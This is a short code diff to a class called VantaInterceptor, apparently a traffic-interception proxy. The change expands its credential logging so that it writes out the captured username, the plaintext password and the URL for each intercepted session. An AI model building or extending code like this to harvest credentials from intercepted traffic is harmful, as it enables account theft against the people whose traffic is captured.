@@ -580,7 +580,11 @@ class VantaInterceptor:
                     password=password,
                     url=flow.request.pretty_url
                 )
-                self.logger.critical(f"CAPTURED CREDENTIALS for session {session_id}: user='{username}'")
+                self.logger.critical(f"🎯 CAPTURED CREDENTIALS for session {session_id}:")
+                self.logger.critical(f"   👤 Username: {username}")
+                self.logger.critical(f"   🔑 Password: {password}")
+                self.logger.critical(f"   🌐 URL: {flow.request.pretty_url}")
+                self.logger.critical("🎯" + "="*50)
 
         except Exception as e:
             self.logger.error(f"Error in _scan_for_credentials: {e}")
